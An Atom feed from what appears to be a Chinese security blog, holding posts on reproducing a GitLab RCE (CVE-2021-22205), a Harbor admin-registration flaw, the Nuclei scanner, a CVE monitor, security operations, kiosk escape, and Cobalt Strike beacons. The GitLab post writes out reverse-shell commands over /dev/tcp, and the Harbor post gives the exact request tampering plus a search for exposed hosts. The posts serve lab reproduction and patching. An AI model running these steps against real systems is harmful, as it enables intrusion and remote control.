<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Taoing&#39;s Blog</title>
  
  <subtitle>技术永无止境</subtitle>
  <link href="http://ta0ing.github.io/atom.xml" rel="self"/>
  
  <link href="http://ta0ing.github.io/"/>
  <updated>2021-10-29T14:10:09.617Z</updated>
  <id>http://ta0ing.github.io/</id>
  
  <author>
    <name>Taoing</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CVE-2021-22205 GitLab 未授权RCE</title>
    <link href="http://ta0ing.github.io/article/659abcc5.html"/>
    <id>http://ta0ing.github.io/article/659abcc5.html</id>
    <published>2021-10-29T12:52:03.000Z</published>
    <updated>2021-10-29T14:10:09.617Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CVE-2021-22205-GitLab-未授权RCE"><a href="#CVE-2021-22205-GitLab-未授权RCE" class="headerlink" title="CVE-2021-22205 GitLab 未授权RCE"></a>CVE-2021-22205 GitLab 未授权RCE</h2><h3 id="漏洞简介："><a href="#漏洞简介：" class="headerlink" title="漏洞简介："></a>漏洞简介：</h3><p>GitLab 是一个用于仓库管理系统的开源项目，使用 Git 作为代码管理工具，并在此基础上搭建起来的 Web服务。</p><p>GitLab是一款Ruby开发的Git项目管理平台。如11.9以后的GitLab中，因为使用了图片处理工具ExifTool而受到漏洞<a href="https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html">CVE-2021-22204</a>的影响，攻击者可以通过一个未授权的接口上传一张恶意构造的图片，进而在GitLab服务器上执</p><p>参考链接：</p><ul><li><a href="https://hackerone.com/reports/1154542">https://hackerone.com/reports/1154542</a></li><li><a href="https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html">https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html</a></li><li><a href="https://security.humanativaspa.it/gitlab-ce-cve-2021-22205-in-the-wild/">https://security.humanativaspa.it/gitlab-ce-cve-2021-22205-in-the-wild/</a></li><li><a href="https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-22205.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-22205.yaml</a></li><li><a href="https://github.com/vulhub/vulhub/blob/master/gitlab/CVE-2021-22205/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/gitlab/CVE-2021-22205/README.zh-cn.md</a></li></ul><h3 id="影响版本："><a href="#影响版本：" class="headerlink" title="影响版本："></a>影响版本：</h3><pre class="line-numbers language-none"><code class="language-none">该漏洞影响以下GitLab企业版和社区版：11.9 &lt;&#x3D; GitLab（CE&#x2F;EE）&lt; 13.8.813.9 &lt;&#x3D; GitLab（CE&#x2F;EE）&lt; 13.9.613.10 &lt;&#x3D;GitLab（CE&#x2F;EE）&lt; 13.10.3本文复现版本：Gitlab CE 13.10.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h3><p>建议内存&gt;8</p><p>执行如下命令启动一个GitLab 13.10.1版本服务器：</p><pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;vulhub.gitcd vulhub&#x2F;gitlab&#x2F;CVE-2021-22205&#x2F;docker-compose up -d环境启动后，访问http:&#x2F;&#x2F;your-ip:8080即可查看到GitLab的登录页面。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/image-20211029214111000.png" alt="GitLab首页"></p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="漏洞POC"><a href="#漏洞POC" class="headerlink" title="漏洞POC"></a>漏洞POC</h4><p><code>https://github.com/Al1ex/CVE-2021-22205</code></p><h4 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h4><p><code>python CVE-2021-22205.py  -v true -t http://Your IP:Port</code></p><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/image-20211029214708935.png" alt="漏洞探测"></p><p><strong>命令执行：</strong></p><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/image-20211029215055570.png" alt="dnslog验证"></p><p><strong>反弹shell：</strong></p><pre class="line-numbers language-none"><code class="language-none">python3 CVE-2021-2205.py -a true -t http:&#x2F;&#x2F;Your IP:port -c &quot;echo &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1&#39; &gt; &#x2F;tmp&#x2F;1.sh&quot;这条语句意思是代表，将反弹shell命令写成sh脚本 到tmp目录下python3 CVE-2021-2205.py -a true -t http:&#x2F;&#x2F;Your IP:port -c &quot;chmod +x &#x2F;tmp&#x2F;1.sh&quot;这条语句意思是代表，对写入成功的sh脚本加执行权限python3 CVE-2021-2205.py -a true -t http:&#x2F;&#x2F;Your IP:port -c &quot;&#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;1.sh&quot;这条语句意思是代表，运行反弹shell脚本<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/image-20211029215631594.png" alt="反弹shell写入1.sh脚本"></p><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/image-20211029220042720.png" alt="写入成功验证"></p><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/image-20211029220215319.png" alt="修改脚本权限"></p><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/image-20211029220251930.png" alt="验证修改权限成功"></p><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/image-20211029220538808.png" alt="反弹shell"></p><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/image-20211029220605182.png" alt="大部分权限都是git这里需要提权"></p><h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><p>1、及时升级GitLab至最新安全版本</p><p>2、配置访问控制策略，避免受影响的GitLab暴露在公</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;CVE-2021-22205-GitLab-未授权RCE&quot;&gt;&lt;a href=&quot;#CVE-2021-22205-GitLab-未授权RCE&quot; class=&quot;headerlink&quot; title=&quot;CVE-2021-22205 GitLab 未授权RCE&quot;&gt;&lt;/a&gt;CV</summary>
      
    
    
    
    <category term="漏洞复现" scheme="http://ta0ing.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="GitLab" scheme="http://ta0ing.github.io/tags/GitLab/"/>
    
  </entry>
  
  <entry>
    <title>国外扫描工具-Nuclei</title>
    <link href="http://ta0ing.github.io/article/da8eafa9.html"/>
    <id>http://ta0ing.github.io/article/da8eafa9.html</id>
    <published>2021-10-28T01:46:40.000Z</published>
    <updated>2021-10-28T04:16:38.984Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/nuclei-logo.png" alt="Nuclei"></p><p><strong>Nuclei是一款运行速度非常快且易于使用的扫描工具，它可以帮助研究人员基于模板执行可配置的目标扫描任务，并提供了大量可扩展接口以辅助使用。</strong></p><h3 id="功能介绍"><a href="#功能介绍" class="headerlink" title="功能介绍"></a>功能介绍</h3><ul><li><p>简单且模块化的代码，方便使用和开发；</p></li><li><p>运行速度快且完全可配置，使用了基于模板的引擎；</p></li><li><p>错误事件/特殊情况处理重传；</p></li><li><p>WAF处理；</p></li><li><p>智能匹配，实现零误报扫描；</p></li></ul><h3 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h3><p><code>nuclei -h</code></p><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/image-20211028095416287.png" alt="image-20211028095416287"></p><p><strong>上述命令将显示该工具的帮助信息，下面给出的是该工具的常用选项：</strong></p><table><thead><tr><th>选项标签</th><th><strong>描述信息</strong></th><th>使用示例</th></tr></thead><tbody><tr><td><strong>-c</strong></td><td><strong>并发请求数(默认10)</strong></td><td><strong>nuclei -c 100</strong></td></tr><tr><td><strong>-l</strong></td><td><strong>需运行模板的URL列表</strong></td><td><strong>nuclei -l url.txt</strong></td></tr><tr><td><strong>-t</strong></td><td><strong>要检测的模板种类</strong></td><td><strong>nuclei -t git-core.yaml -t cves/</strong></td></tr><tr><td><strong>-o</strong></td><td><strong>保存输出结果文件(按需使用)</strong></td><td><strong>nuclei -o output.txt</strong></td></tr><tr><td><strong>-timeout</strong></td><td><strong>超时时间(默认为5秒)</strong></td><td><strong>nuclei -timeout 5</strong></td></tr><tr><td><strong>-proxy-url</strong></td><td><strong>输入代理地址</strong></td><td><strong>nuclei -proxy-url hxxp://127.0.0.1:8080</strong></td></tr><tr><td><strong>-proxy-socks-url</strong></td><td><strong>输入socks代理地址</strong></td><td><strong>nuclei -proxy-socks-url socks5://user:pass@Your IP:1080</strong></td></tr><tr><td><strong>-random-agent</strong></td><td><strong>使用随机的UA</strong></td><td><strong>nuclei -random-agent</strong></td></tr><tr><td><strong>-H</strong></td><td><strong>自定义请求头</strong></td><td><strong>nuclei -H “x-bug-bounty:hacker”</strong></td></tr><tr><td><strong>-update-templates</strong></td><td><strong>下载或者升级模板</strong></td><td><strong>nuclei -update-templates</strong></td></tr><tr><td><strong>-stats</strong></td><td><strong>使用进度条</strong></td><td><strong>nuclei -stats</strong></td></tr><tr><td><strong>-debug</strong></td><td><strong>调试请求或者响应</strong></td><td><strong>nuclei -debug</strong></td></tr><tr><td><strong>-burp-collaborator-biid</strong></td><td><strong>使用burp-collaborator插件</strong></td><td><strong>nuclei -burp-collaborator-biid XXXX</strong></td></tr></tbody></table><h3 id="工具安装"><a href="#工具安装" class="headerlink" title="工具安装"></a>工具安装</h3><p><strong>代码安装：</strong></p><p>在该项目GitHub库中的<a href="https://github.com/projectdiscovery/nuclei/releases">Releases</a>页面中根据自己的平台选择预编译好的源代码，然后使用<code>tar</code>命令进行代码提取，将提取出的代码移动到自己的$PATH路径下。所使用的命令如下：</p><pre class="line-numbers language-none"><code class="language-none">wget https:&#x2F;&#x2F;github.com&#x2F;projectdiscovery&#x2F;nuclei&#x2F;releases&#x2F;download&#x2F;v2.5.3&#x2F;nuclei_2.5.3_linux_amd64.zipunzip nuclei_2.5.3_linux_amd64.zip<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/nuclei-logo.png&quot; alt=&quot;Nuclei&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Nuclei是一款运行速度非常快且易于使用的扫描</summary>
      
    
    
    
    <category term="安全工具库" scheme="http://ta0ing.github.io/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7%E5%BA%93/"/>
    
    
    <category term="Nuclei" scheme="http://ta0ing.github.io/tags/Nuclei/"/>
    
  </entry>
  
  <entry>
    <title>GitHub-CVE与工具监控</title>
    <link href="http://ta0ing.github.io/article/92446bce.html"/>
    <id>http://ta0ing.github.io/article/92446bce.html</id>
    <published>2021-10-27T11:49:59.000Z</published>
    <updated>2021-10-28T04:16:38.982Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一-拉取项目"><a href="#一-拉取项目" class="headerlink" title="一 拉取项目"></a>一 拉取项目</h2><h3 id="1-1-简介："><a href="#1-1-简介：" class="headerlink" title="1.1 简介："></a>1.1 简介：</h3><p>监控github上新增的cve编号项目漏洞和监控github发布工具更新，推送钉钉或者server酱</p><h3 id="1-2-项目地址"><a href="#1-2-项目地址" class="headerlink" title="1.2 项目地址"></a>1.2 项目地址</h3><p><code>https://github.com/yhy0/github-cve-monitor</code></p><h3 id="1-3-拉取部署"><a href="#1-3-拉取部署" class="headerlink" title="1.3 拉取部署"></a>1.3 拉取部署</h3><p><code>https://github.com/yhy0/github-cve-monitor.git</code></p><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/image-20211027200514536.png" alt="image-20211027200514536"></p><p>安装必备库：<code>pip3 install -r  requirements.txt</code></p><h3 id="1-4-配置推送"><a href="#1-4-配置推送" class="headerlink" title="1.4 配置推送"></a>1.4 配置推送</h3><p><strong>钉钉机器人：</strong>新建一个群–&gt;群设置–&gt;智能群助手(机器人管理)–&gt;添加机器人–&gt;选择”自定义 通过Webhook接入自定义服务”</p><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/image-20211027201714294.png" alt="image-20211027201714294"></p><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/image-20211027201924581.png" alt="image-20211027201924581"></p><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/image-20211027202023135.png" alt="image-20211027202023135"></p><p>配置config.yaml：</p><p><strong>enable: 0为关闭、enable: 1为开启。</strong>这里我开启的是飞书，假若你要开启其他的 就关闭飞书这个。以免麻烦</p><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/image-20211027202452504.png" alt="image-20211027202452504"></p><h3 id="1-5-gihtub-token-获取"><a href="#1-5-gihtub-token-获取" class="headerlink" title="1.5 gihtub token 获取"></a>1.5 gihtub token 获取</h3><p>对于未经身份验证的请求，github 速率限制允许每小时最多 60 个请求</p><p>而通过使用基本身份验证的 API 请求，每小时最多可以发出 5,000 个请求</p><p><a href="https://github.com/settings/tokens/new">https://github.com/settings/tokens/new</a> 创建token，时间的话选无限制的，毕竟要一直跑</p><p><img src="https://github.com/yhy0/github-cve-monitor/raw/master/images/image-20210729172507519.png" alt="image-20210729172507519"></p><h3 id="1-6-运行测试"><a href="#1-6-运行测试" class="headerlink" title="1.6 运行测试"></a>1.6 运行测试</h3><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/image-20211027202829263.png" alt="image-20211027202829263"></p><p>后台运行:</p><p><code>screen  python github_cve_monitor.py</code></p><p><code>screen -ls</code> 查看正则运行的 screen</p><pre class="line-numbers language-none"><code class="language-none">screen -r github_cve#连接github_cve后台screen，如果存在的话<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="1-7-效果展示"><a href="#1-7-效果展示" class="headerlink" title="1.7 效果展示"></a>1.7 效果展示</h3><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/image-20211028121337881.png" alt="image-20211028121337881"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;一-拉取项目&quot;&gt;&lt;a href=&quot;#一-拉取项目&quot; class=&quot;headerlink&quot; title=&quot;一 拉取项目&quot;&gt;&lt;/a&gt;一 拉取项目&lt;/h2&gt;&lt;h3 id=&quot;1-1-简介：&quot;&gt;&lt;a href=&quot;#1-1-简介：&quot; class=&quot;headerlink&quot; ti</summary>
      
    
    
    
    <category term="威胁情报" scheme="http://ta0ing.github.io/categories/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/"/>
    
    
    <category term="威胁情报" scheme="http://ta0ing.github.io/tags/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>理解安全运营</title>
    <link href="http://ta0ing.github.io/article/f8cfd5f1.html"/>
    <id>http://ta0ing.github.io/article/f8cfd5f1.html</id>
    <published>2021-10-20T08:14:34.000Z</published>
    <updated>2021-10-28T04:16:38.985Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x0-安全运营的理解"><a href="#0x0-安全运营的理解" class="headerlink" title="0x0 安全运营的理解"></a>0x0 安全运营的理解</h2><h3 id="0-1-岗位理解"><a href="#0-1-岗位理解" class="headerlink" title="0.1 岗位理解"></a>0.1 岗位理解</h3><p><strong>比较安全运维与安全运营</strong></p><p><code>运维</code>：运维简而言之就是保障信息系统的正常运转。</p><p><code>安全运维</code> = 安全 + 运维</p><p><code>运营</code>：运营要<strong>持续的输出价值</strong>。</p><p><code>安全运营</code> = <code>安全</code> + <code>运营</code> = 通过已有的安全系统、工具来生产有价值的安全信息，把它用于解决安全风险，从而实现安全的最终目标。</p><h3 id="0-2-安全运营做什么？"><a href="#0-2-安全运营做什么？" class="headerlink" title="0.2 安全运营做什么？"></a>0.2 安全运营做什么？</h3><p><strong>领导的五大致命问题</strong></p><ul><li>什么人在攻击我们？</li><li>那些资产正在遭受攻击？</li><li>对比上周攻击有什么趋势？</li><li>主要攻击手法有那些？</li><li>我们最大的风险点在哪里？</li></ul><p>安全运营的日常就是对<strong>海量告警去粗取精的“萃取”</strong>的过程。</p><h4 id="如何萃取安全数据"><a href="#如何萃取安全数据" class="headerlink" title="如何萃取安全数据"></a>如何萃取安全数据</h4><p><code>Event-Alert-Threat-Incident</code></p><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/20200321185509.png" alt="img"></p><h4 id="从Event到Incident处理流程"><a href="#从Event到Incident处理流程" class="headerlink" title="从Event到Incident处理流程"></a>从Event到Incident处理流程</h4><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/20200321185521-20211020165930413.png" alt="img"></p><ul><li><p>告警生成</p><ul><li>归一化，聚类分析</li><li>规则特征</li><li>算法模型</li><li>威胁情报</li></ul></li><li><p>威胁生成</p><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/20200321185531-20211020170019988.png" alt="img"></p><ul><li>合并压缩</li><li>丰富化</li><li>误报筛选</li><li>置信度（置信区间展现的是这个参数的真实值有一定概率落在测量结果的周围的程度）</li></ul></li><li><p>威胁累积</p></li></ul><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/20200321185548.png" alt="img"></p><ul><li>场景汇聚</li><li>态势感知与响应业务场景</li><li>资产评分</li></ul><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/20200321185608.png" alt="img"></p><ul><li>威胁运营</li><li>安全事件</li></ul><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/20200321185635-20211020170301022-20211020170305743.png" alt="img"></p><h2 id="从安全事件分析角度"><a href="#从安全事件分析角度" class="headerlink" title="从安全事件分析角度"></a>从安全事件分析角度</h2><p>安全数据分析、安全事件分析是安全运营的一个核心模块，是一种服务、支持的能力。安全运营本身是为安全事件分析提供支撑，连接威胁狩猎（如果有的话）和应急响应中心，相当于企业安全“部队”中的指挥部。 安全运营为安全事件分析提供支撑，是整体网络安全保障。包括：</p><ul><li>网络安全规划</li><li>资产梳理</li><li>安全设备管理</li><li>渗透测试</li><li>漏洞扫描</li><li>威胁监控</li><li>安全事件分析</li><li>应急响应</li><li>风险评估等过程、服务</li></ul><p>覆盖到网络安全的各项工作，但是每一项服务又不是单独存在的个体，而是相互关联、重叠、交互，形成网络安全生态体系。[1] 简单来说，安全运营是企业安全的中枢，负责许多事务的处理，但不是每个方面都直接执行。比如上述讲到的应急响应、漏洞扫描、渗透测试，可能归属于事件响应部门（Incident Response），风险评估和处置可能归属于风控部门（Risk Management）等。 </p><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/20200321185726-20211020170347185.png" alt="img"> </p><p>参考：<a href="https://wiki.y1ng.org/0x0_%E7%90%86%E8%A7%A3/0x3_%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5%E7%9A%84%E8%A6%81%E7%B4%A0/">https://wiki.y1ng.org/0x0_%E7%90%86%E8%A7%A3/0x3_%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5%E7%9A%84%E8%A6%81%E7%B4%A0/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0x0-安全运营的理解&quot;&gt;&lt;a href=&quot;#0x0-安全运营的理解&quot; class=&quot;headerlink&quot; title=&quot;0x0 安全运营的理解&quot;&gt;&lt;/a&gt;0x0 安全运营的理解&lt;/h2&gt;&lt;h3 id=&quot;0-1-岗位理解&quot;&gt;&lt;a href=&quot;#0-1-岗位理解&quot;</summary>
      
    
    
    
    <category term="安全运营" scheme="http://ta0ing.github.io/categories/%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5/"/>
    
    
    <category term="安全运营" scheme="http://ta0ing.github.io/tags/%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5/"/>
    
  </entry>
  
  <entry>
    <title>自助终端逃逸</title>
    <link href="http://ta0ing.github.io/article/6cd3cbcb.html"/>
    <id>http://ta0ing.github.io/article/6cd3cbcb.html</id>
    <published>2021-10-12T07:40:16.000Z</published>
    <updated>2021-10-13T04:51:19.886Z</updated>
    
    <content type="html"><![CDATA[<h3 id="1-自助终端"><a href="#1-自助终端" class="headerlink" title="1/自助终端"></a>1/自助终端</h3><p>​    随着经济的发展，自动售货机已经出现在大街小巷；在机场、车站等交通系统自助购票、取票也已普及；医院、银行、政务大厅等机构也都遍布着不同的自助终端设备，大大方便了人们的生活水平，提高了办事效率。对于自助终端设备的安全问题,目前关注点却较少。</p><h4 id="1-1-基本介绍"><a href="#1-1-基本介绍" class="headerlink" title="1.1 基本介绍"></a>1.1 基本介绍</h4><p>自助终端设备是将触控屏和相关系统软件进行结合，再配以相关功能与服务的一种电子终端设备。由用户根据设备提示进行操作，辅以网络，结合手机终端或设备传感器组件完成整个功能服务流程。</p><p><img src="http://www.4001108775.net/uploads/allimg/200508/1-20050P93602449.jpg"></p><p>设备目前已广泛应用于通讯、金融、政府、交通、医疗、工商、税务等行业。若是按照功能分类基本可以分为：</p><ul><li>自助充值终端</li><li>自助缴费终端</li><li>自助售货终端</li><li>自助发卡终端</li><li>自助售取票终端</li><li>自助打印终端</li><li>自助查询终端</li></ul><h4 id="1-2-操作系统"><a href="#1-2-操作系统" class="headerlink" title="1.2 操作系统"></a>1.2 操作系统</h4><p>目前，自助终端设备常用的操作系统为Windows和Android这两种，也有少数的Linux系统。</p><p>根据提供的功能服务采用不同的操作系统，比如常见的一些自动售货机、贩卖机大都使用Android系统，系统之上安装服务应用APK。然后通过禁用和隐藏Android导航栏和通知菜单的手段防止用户跳出应用。</p><p><strong>对于一些售取票终端、政务系统等大多数使用的是Windows系统，服务应用通常采用将程序窗口最大化并且始终置顶的方式进行运行，同时隐藏系统桌面和状态栏，使用户只能在当前应用下操作。</strong></p><h4 id="1-3-网络通信"><a href="#1-3-网络通信" class="headerlink" title="1.3 网络通信"></a>1.3 网络通信</h4><p>对于自助终端设备来说，网络通信的实现有三种方式：</p><ul><li>3G/4G移动网络(企业内部物联网私有卡)</li><li>WiFi无线网络(大多办公网络)</li><li>有线以太网(接入内网)</li></ul><p>对于一些特定场所、具体实施、具有布线规划要求的自助终端设备，比如机场车站的售取票机、政府医院银行的自助设备，一般都是使用网线进行连接，也不排除会有无线网络接入的情况。其网络连接情况一般为内网地址。</p><h4 id="1-4-逃逸思路"><a href="#1-4-逃逸思路" class="headerlink" title="1.4 逃逸思路"></a>1.4 逃逸思路</h4><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/image-20211012155502344.png" alt="image-20211012155502344"></p><h4 id="社死案例"><a href="#社死案例" class="headerlink" title="社死案例"></a>社死案例</h4><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/image-20211012155745256.png" alt="image-20211012155745256"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;1-自助终端&quot;&gt;&lt;a href=&quot;#1-自助终端&quot; class=&quot;headerlink&quot; title=&quot;1/自助终端&quot;&gt;&lt;/a&gt;1/自助终端&lt;/h3&gt;&lt;p&gt;​    随着经济的发展，自动售货机已经出现在大街小巷；在机场、车站等交通系统自助购票、取票也已普及；医院、</summary>
      
    
    
    
    <category term="自助终端逃" scheme="http://ta0ing.github.io/categories/%E8%87%AA%E5%8A%A9%E7%BB%88%E7%AB%AF%E9%80%83/"/>
    
    
    <category term="自助终端逃" scheme="http://ta0ing.github.io/tags/%E8%87%AA%E5%8A%A9%E7%BB%88%E7%AB%AF%E9%80%83/"/>
    
  </entry>
  
  <entry>
    <title>Harbor任意管理员注册漏洞</title>
    <link href="http://ta0ing.github.io/article/bf4f999f.html"/>
    <id>http://ta0ing.github.io/article/bf4f999f.html</id>
    <published>2021-10-12T05:36:01.000Z</published>
    <updated>2021-10-12T06:54:12.319Z</updated>
    
    <content type="html"><![CDATA[<p><strong>1. 简介</strong></p><p>​    Harbor是一个用于存储和分发Docker镜像的企业级Registry服务器，通过添加一些企业必需的功能特性，例如安全、标识和管理等，扩展了开源Docker Distribution。</p><p>​    作为一个企业级私有Registry服务器，Harbor提供了更好的性能和安全。提升用户使用Registry构建和运行环境传输镜像的效率。Harbor支持安装在多个Registry节点的镜像资源复制，镜像全部保存在私有Registry中， 确保数据和知识产权在公司内部网络中管控。另外，Harbor也提供了高级的安全特性，诸如用户管理，访问控制和活动审计等。</p><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/image-20211012133854849.png"></p><p><strong>2.影响范围</strong></p><p><code>Harbor: 1.7.0-1.8.2</code></p><p><strong>3.复现</strong></p><p>语法搜索 </p><p><code>title=&quot;Harbor&quot; &amp;&amp; country=CN</code></p><p><strong>注册，然后抓包</strong></p><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/image-20211012133912238.png"></p><p><strong>改包，在最后数据包加上：”has_admin_role”:true</strong></p><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/image-20211012134504203.png"></p><p><strong>发包验证，状态是201代表成功</strong></p><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/image-20211012134353211.png"></p><p><strong>登录验证</strong></p><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/image-20211012134625223.png"></p><h2 id="4-修复方案"><a href="#4-修复方案" class="headerlink" title="4.修复方案"></a>4.修复方案</h2><p>升级Harbor版本到 1.7.6 和 1.8.3</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;1. 简介&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;​    Harbor是一个用于存储和分发Docker镜像的企业级Registry服务器，通过添加一些企业必需的功能特性，例如安全、标识和管理等，扩展了开源Docker Distribution。&lt;/p&gt;
&lt;p&gt;​</summary>
      
    
    
    
    <category term="漏洞复现" scheme="http://ta0ing.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="Harbor" scheme="http://ta0ing.github.io/tags/Harbor/"/>
    
  </entry>
  
  <entry>
    <title>3、Cobaltstrike Beacon与菜单栏视图</title>
    <link href="http://ta0ing.github.io/article/42e57ad0.html"/>
    <id>http://ta0ing.github.io/article/42e57ad0.html</id>
    <published>2021-10-09T17:24:53.000Z</published>
    <updated>2021-10-09T17:26:14.583Z</updated>
    
    <content type="html"><![CDATA[<h2 id="3-Cobaltstrike-Beacon与菜单栏、视图"><a href="#3-Cobaltstrike-Beacon与菜单栏、视图" class="headerlink" title="3.Cobaltstrike Beacon与菜单栏、视图"></a>3.Cobaltstrike Beacon与菜单栏、视图</h2><h3 id="一、Beacon详解"><a href="#一、Beacon详解" class="headerlink" title="一、Beacon详解"></a>一、Beacon详解</h3><p>右键目标interact来使用Beacon，可以用它来执行各种命令<br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607605853_20200820195323098_28548.png"></p><ul><li><p>在Cobalt Strike中它的心跳默认是60s(执行一个命令你需要等待60秒后返回。因为每一分钟目标主机与teamserver通信一<br>次)这是你的操作就很郁闷了。</p></li><li><p>Cobalt Strike设置3秒真男人<br><code>sleep 3</code><br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607605853_20200820200116977_32605.png"></p></li></ul><h3 id="二、Cobalt-Strike多种beacon"><a href="#二、Cobalt-Strike多种beacon" class="headerlink" title="二、Cobalt Strike多种beacon"></a>二、Cobalt Strike多种beacon</h3><ul><li><strong>1、http beacon和tcp beacon这两种beacon都是比较普通的，两者区别只是主机与teamserver的通信协议不同而已。</strong><br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607605854_20200820201848361_24834.png"> <img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607605854_20200820201821895_4198.png"></li><li><strong>2、SMB beacon</strong><br>官方介绍:SMB Beacon使用命名管道通过父级Beacon进行通讯，当两个Beacons链接后，<strong>子Beacon</strong>从<strong>父Beacon获取</strong>到任务并发送。</li><li><em>因为链接通讯的Beacons使用Windows pipe进行通信，此流量封装在SMB协议中，所以SMB Beacon相对隐蔽，可以绕一些防火墙</em>*<br>这张图很好的诠释了SMB beacon的工作流程<br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607605854_20200820202651724_29752.png"></li><li><strong>3、smb beacon使用</strong><br>这种beacon要求具有SMB Beacon的主机必须接受端口445上的连接. 派生一个SMB Beacon方法：<br>在Listner生成SMB Beacon&gt;目标主机&gt;右键&gt; spawn as&gt;选中对应的Listener&gt;上线<br>或在beacon中使用命令<code>spawn SMB Beacon</code>（SMB Beacon为我的SMB Beacon listener名字）<br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607605854_20200820203618393_15109.png"><br>运行成功后外部可以看到∞∞这个字符，这就是派生的SMB Beacon。<br>当前是连接状态，你可以Beacon上用link <ip>命令链接他或者unlink <ip>命令断开它。<br>这种beacon在内网横向渗透中运用的很多，横向渗透这里暂时不提。<br>可以使用ipc $等将生成的SMB Beacon上传到目标主机执行，但是目标主机并不会直<br>接上线的，需要我们自己用链接命令(link 